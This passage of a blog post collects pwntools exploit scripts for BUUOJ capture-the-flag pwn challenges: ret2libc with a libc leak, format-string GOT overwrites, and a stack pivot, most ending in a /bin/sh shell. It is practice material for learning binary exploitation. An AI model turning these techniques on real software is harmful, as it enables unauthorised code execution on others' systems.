<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment">#sh=process(&quot;./jarvisoj_level3&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26537</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x0804844B&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./jarvisoj_level3&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">start_vul=<span class="number">0x0804844B</span></span><br><span class="line">pop3_ret=<span class="number">0x08048519</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;bbbb&#x27;</span>+p32(write_plt)+p32(pop3_ret)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0x4</span>)+p32(start_vul)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">write_addr=u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;write&quot;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh_addr=libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;bbbb&#x27;</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>local</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">sh=process(<span class="string">&quot;./jarvisoj_level3&quot;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,26537)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x0804844B&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./jarvisoj_level3&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">start_vul=<span class="number">0x0804844B</span></span><br><span class="line">pop3_ret=<span class="number">0x08048519</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;bbbb&#x27;</span>+p32(write_plt)+p32(pop3_ret)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0x4</span>)+p32(start_vul)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">write_addr=u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libc_base=write_addr-libc.symbols[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr=libc_base+libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;bbbb&#x27;</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Fmt"><a href="#Fmt" class="headerlink" title="Fmt"></a>Fmt</h2><h3 id="2019-dwkj-pwn1"><a href="#2019-dwkj-pwn1" class="headerlink" title="2019_dwkj_pwn1"></a>2019_dwkj_pwn1</h3><p><a href="fmt/2019_dwkj_pwn1/2019_dwkj_pwn1" title="2019_dwkj_pwn1">attachment</a></p>
<p>exp1:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal=[&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]</span></span><br><span class="line">sh=process(<span class="string">&quot;./2019_dwkj_pwn1&quot;</span>)</span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x080492BC&#x27;)</span></span><br><span class="line">payload=p32(<span class="number">0x804c044</span>)+<span class="string">b&quot;%10$n&quot;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line"><span class="built_in">print</span>(sh.sendline(<span class="string">&quot;4&quot;</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>exp2:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&quot;./2019_dwkj_pwn1&quot;</span>)</span><br><span class="line">bss_addr=<span class="number">0x0804C044</span></span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;bss_addr:<span class="number">0x1111</span>&#125;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line"><span class="built_in">print</span>(sh.sendline(<span class="built_in">str</span>(<span class="number">0x1111</span>)))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>exp3:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&quot;./2019_dwkj_pwn1&quot;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,25037)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./2019_dwkj_pwn1&quot;</span>)</span><br><span class="line">atoi_got=elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_plt&#125;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line"><span class="built_in">print</span>(sh.sendline(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h3><p><a href="fmt/jarvisoj_fm/jarvisoj_fm" title="jarvisoj_fm">attachment</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">x_addr=<span class="number">0x0804A02C</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;%4c%13$n&quot;</span>+p32(x_addr)</span><br><span class="line">sh=process(<span class="string">&quot;./jarvisoj_fm&quot;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,25910)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>or</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">x_addr=<span class="number">0x0804A02C</span></span><br><span class="line"></span><br><span class="line">payload=fmtstr_payload(<span class="number">11</span>,&#123;x_addr:<span class="number">0x4</span>&#125;)</span><br><span class="line">sh=process(<span class="string">&quot;./jarvisoj_fm&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><p><a href="misc/ciscn_2019_n_1/ciscn_2019_n_1" title="ciscn_2019_n_1">attachment</a></p>
<p>exp1:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">want_v1=<span class="number">0x41348000</span></span><br><span class="line"><span class="comment">#sh=process(&quot;./ciscn_2019_n_1&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26268</span>)</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*(<span class="number">0x30</span>-<span class="number">0x4</span>)+p64(want_v1)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h3><p><a href="misc/ciscn_2019_n_8/ciscn_2019_n_8" title="ciscn_2019_n_8">attachment</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#context.terminal=[&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]</span></span><br><span class="line">sh=process(<span class="string">&quot;./ciscn_2019_n_8&quot;</span>)</span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b main&#x27;)</span></span><br><span class="line">payload=p32(<span class="number">17</span>)*<span class="number">14</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h2><h3 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h3><p><a href="stack/ciscn_2019_es_2/ciscn_2019_es_2" title="ciscn_2019_es_2">attachment</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">system_plt=<span class="number">0x08048400</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">sh=process(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,26409)</span></span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x080485FE&#x27;)</span></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x27</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">old_ebp=u32(sh.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(old_ebp))</span><br><span class="line"></span><br><span class="line">leave_ret=<span class="number">0x080484b8</span></span><br><span class="line">ebp_base=old_ebp-<span class="number">0x38</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_plt)+<span class="string">b&#x27;dddd&#x27;</span>+p32(ebp_base+<span class="number">0x10</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;p&#x27;</span>)</span><br><span class="line">payload2+=p32(ebp_base)+p32(leave_ret)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload2)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/tags/">Tag</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-overflow"><span class="toc-number">1.</span> <span class="toc-text">Stack overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rip"><span class="toc-number">1.1.</span> <span class="toc-text">rip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#warmup-csaw-2016"><span class="toc-number">1.2.</span> <span class="toc-text">warmup_csaw_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn1-sctf-2016"><span class="toc-number">1.3.</span> <span class="toc-text">pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-level0"><span class="toc-number">1.4.</span> <span class="toc-text">jarvisoj_level0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-level2"><span class="toc-number">1.5.</span> <span class="toc-text">jarvisoj_level2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-c-1"><span class="toc-number">1.6.</span> <span class="toc-text">ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bjdctf-2020-babystack"><span class="toc-number">1.7.</span> <span class="toc-text">bjdctf_2020_babystack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ogeek2019-babyrop"><span class="toc-number">1.8.</span> <span class="toc-text">ogeek2019_babyrop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-started-3dsctf-2016"><span class="toc-number">1.9.</span> <span class="toc-text">get_started_3dsctf_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-level2-x64"><span class="toc-number">1.10.</span> <span class="toc-text">jarvisoj_level2_x64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HarekazeCTF2019-babyrop"><span class="toc-number">1.11.</span> <span class="toc-text">HarekazeCTF2019_babyrop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#not-the-same-3dsctf-2016"><span class="toc-number">1.12.</span> <span class="toc-text">not_the_same_3dsctf_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-n-5"><span class="toc-number">1.13.</span> <span class="toc-text">ciscn_2019_n_5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-ne-5"><span class="toc-number">1.14.</span> <span class="toc-text">ciscn_2019_ne_5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#trsx-2018-rop"><span class="toc-number">1.15.</span> <span class="toc-text">trsx_2018_rop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bjdctf-2020-babyrop"><span class="toc-number">1.16.</span> <span class="toc-text">bjdctf_2020_babyrop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bjdctf-2020-babystack2"><span class="toc-number">1.17.</span> <span class="toc-text">bjdctf_2020_babystack2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn2-sctf-2016"><span class="toc-number">1.18.</span> <span class="toc-text">pwn2_sctf_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-tell-me-something"><span class="toc-number">1.19.</span> <span class="toc-text">jarvisoj_tell_me_something</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HarekazeCTF2019-baby-rop2"><span class="toc-number">1.20.</span> <span class="toc-text">HarekazeCTF2019_baby_rop2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-level3"><span class="toc-number">1.21.</span> <span class="toc-text">jarvisoj_level3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fmt"><span class="toc-number">2.</span> <span class="toc-text">Fmt</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2019-dwkj-pwn1"><span class="toc-number">2.1.</span> <span class="toc-text">2019_dwkj_pwn1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-fm"><span class="toc-number">2.2.</span> <span class="toc-text">jarvisoj_fm</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-n-1"><span class="toc-number">3.1.</span> <span class="toc-text">ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-n-8"><span class="toc-number">3.2.</span> <span class="toc-text">ciscn_2019_n_8</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-Migration"><span class="toc-number">4.</span> <span class="toc-text">Stack Migration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-es-2"><span class="toc-number">4.1.</span> <span class="toc-text">ciscn_2019_es_2</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/24/buuoj-pwn/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/24/buuoj-pwn/&text=buuoj pwn"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/24/buuoj-pwn/&title=buuoj pwn"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/24/buuoj-pwn/&is_video=false&description=buuoj pwn"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=buuoj pwn&body=Check out this article: http://example.com/2022/10/24/buuoj-pwn/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/24/buuoj-pwn/&title=buuoj pwn"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/24/buuoj-pwn/&title=buuoj pwn"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/24/buuoj-pwn/&title=buuoj pwn"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/24/buuoj-pwn/&title=buuoj pwn"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/24/buuoj-pwn/&name=buuoj pwn&description=&lt;p&gt;This article will record some poc for buuoj pwn .&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/24/buuoj-pwn/&t=buuoj pwn"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    Bkfish
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
